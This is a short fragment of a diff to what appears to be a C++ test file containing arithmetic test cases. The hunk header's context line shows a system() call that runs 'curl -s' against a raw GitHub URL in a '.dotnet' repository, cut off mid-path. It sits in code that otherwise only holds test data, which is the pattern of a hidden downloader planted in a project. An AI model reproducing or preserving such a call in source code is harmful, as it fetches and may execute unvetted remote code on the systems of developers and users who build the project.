@@ -436,3 +436,4 @@ system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj
         {.lhs{10}, .rhs = 3, .expectedResult{2}},
     })
 ));
+
